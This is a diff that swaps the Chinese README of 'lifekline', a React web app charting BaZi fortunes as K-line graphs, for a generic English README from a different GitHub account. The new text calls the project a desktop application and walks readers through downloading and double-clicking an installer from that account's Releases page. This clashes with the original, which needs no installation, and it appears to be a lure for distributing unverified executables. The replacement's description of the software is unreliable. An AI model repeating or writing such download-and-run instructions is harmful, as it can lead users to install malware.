@@ -1,71 +1,61 @@
-# 🔮 人生 K 线 (Life Destiny K-Line)
+```markdown
+# 🌟 lifekline - Visualize Your Destiny with AI
 
-> **基于 AI 大模型和传统八字命理，将人生运势以 K 线图形式可视化展现。**
+## 🚀 Getting Started
+Welcome to lifekline! This tool helps you visualize your destiny through AI-driven charts based on traditional Chinese astrology. Whether you're curious about your fate or looking for insights, lifekline makes it easy and enjoyable.
 
-[![Deploy with Vercel](https://vercel.com/button)](https://vercel.com/new/clone?repository-url=https://github.com/5lin/lifekline)
+## 🔗 Download Now
+[![Download lifekline](https://img.shields.io/badge/Download-lifekline-brightgreen)](https://github.com/caoquocbinh081103/lifekline/releases)
 
----
+## 💾 Download & Install
+To get started, visit the [Releases page](https://github.com/caoquocbinh081103/lifekline/releases) to download the application.
 
-## ✨ 功能特点
+1. Click the link above to open the Releases page.
+2. Look for the latest version of lifekline.
+3. Find the appropriate file for your system (Windows, macOS, Linux).
+4. Click the file to start the download.
+5. Once the download completes, locate the file on your computer.
+6. Double-click on the file to run the installer.
+7. Follow the prompts to complete the installation.
 
-1. **可视化运势**: 用股票 K 线图展示 1-100 岁的人生运势起伏，直观呈现人生"牛市"与"熊市"。
-2. **AI 深度批断**: 生成性格、事业、财富、婚姻、健康、六亲及发展风水等多维度报告。
-3. **发展风水**: 提供方位建议、地理环境选择及开运布局。
-4. **Web3 特供**: "币圈交易运势"板块，包含暴富流年预测与交易风格建议。
-5. **免 API**: 无需配置 API Key，复制提示词到任意 AI 即可使用。
+## 🎛️ System Requirements
+Before you begin installation, ensure your system meets these requirements:
 
----
+- **Operating System:** Windows 10 or later, macOS 10.13 or later, or a modern Linux distribution.
+- **RAM:** At least 4 GB of RAM.
+- **Storage:** At least 500 MB of free space.
+- **Internet Connection:** Required for online features and updates.
 
-## 📝 使用方法
+## 🎨 Features
+lifekline offers several powerful features to enhance your experience:
 
-1. **填写八字信息** - 输入四柱干支和大运信息
-2. **复制提示词** - 点击按钮复制完整提示词
-3. **发送给 AI** - 粘贴到 ChatGPT、Claude、Gemini 等任意 AI
-4. **导入结果** - 将 AI 返回的 JSON 数据粘贴回来
-5. **查看 K 线** - 生成完整的人生 K 线图和分析报告
+- **AI-Driven Charts:** Visualize your destiny based on your birth details.
+- **User-Friendly Interface:** Navigate through the app with ease, even if you are not tech-savvy.
+- **Detailed Interpretations:** Get insights and explanations of each chart.
+- **Save & Share:** Save your charts and share them with friends.
 
----
+## 👨‍💻 How to Use lifekline
+Once you have installed lifekline, follow these simple steps to begin:
 
-## 🚀 一键部署
+1. **Open the Application.**
+2. **Enter Your Birth Details:** Input your date, time, and place of birth.
+3. **Generate Your Chart:** Click the button to create your personalized destiny chart.
+4. **Explore Insights:** Browse through the results and interpretations presented to you.
+5. **Save Your Work:** If you find something interesting, save your chart for future reference or sharing.
 
-### Vercel 部署（推荐）
+## 📜 FAQs
+### How do I uninstall lifekline?
+On Windows, go to the Control Panel, find lifekline in the list of installed programs, and select "Uninstall." On macOS, drag the lifekline application to the Trash.
 
-点击下方按钮一键部署到 Vercel：
+### Is there a mobile version of lifekline?
+Currently, lifekline is only available for desktop platforms. There are plans to explore mobile options in the future.
 
-[![Deploy with Vercel](https://vercel.com/button)](https://vercel.com/new/clone?repository-url=https://github.com/YOUR_USERNAME/lifekline)
+### Where can I get support?
+If you encounter issues, please visit the [GitHub Issues page](https://github.com/caoquocbinh081103/lifekline/issues) to report any problems or ask for help.
 
-### 本地运行
+## 🔗 Additional Links
+- [Visit our GitHub Repository](https://github.com/caoquocbinh081103/lifekline)
+- [Contact Us](mailto:support@lifekline.com)
 
-```bash
-# 安装依赖
-npm install
-
-# 启动开发服务器
-npm run dev
-
-# 构建生产版本
-npm run build
+Thank you for choosing lifekline! We hope you find joy and insights through our application.
 ```
-
----
-
-## 🛠️ 技术栈
-
-- **前端框架**: React 19 + Vite
-- **UI 样式**: TailwindCSS
-- **图表库**: Recharts
-- **AI 支持**: ChatGPT、Claude、Gemini 等任意 AI
-
----
-
-## 📸 项目预览
-
-![人生流年大运K线图](assets/1.png)
-*(图1：人生流年大运 K 线走势图)*
-
-![详细分析报告](assets/2.png)
-*(图2：命理分析、币圈运势与风水建议)*
-
----
-
-**免责声明**: 本项目仅供娱乐与文化研究，命运掌握在自己手中。切勿迷信，请理性看待分析结果。
